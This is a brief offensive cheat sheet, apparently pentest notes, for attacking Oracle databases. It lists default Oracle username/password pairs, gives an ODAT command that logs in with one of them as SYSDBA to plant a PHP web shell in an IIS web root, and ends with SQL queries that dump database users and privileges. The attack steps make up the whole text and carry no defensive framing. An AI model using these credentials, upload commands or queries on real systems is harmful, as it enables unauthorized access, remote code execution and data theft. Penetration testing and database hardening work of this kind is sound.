
1-Credential-based Access
```
# Common Oracle credentials
scott/tiger
system/manager
sys/sys
dbsnmp/dbsnmp
```

2-File Upload Exploitation
```
# Upload web shell
./odat.py utlfile -s target -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.php ./shell.php
```

3-Database Information Extraction
```
# Extract sensitive information
SQL> SELECT * FROM dba_users;
SQL> SELECT * FROM dba_role_privs;
SQL> SELECT * FROM dba_tab_privs;
```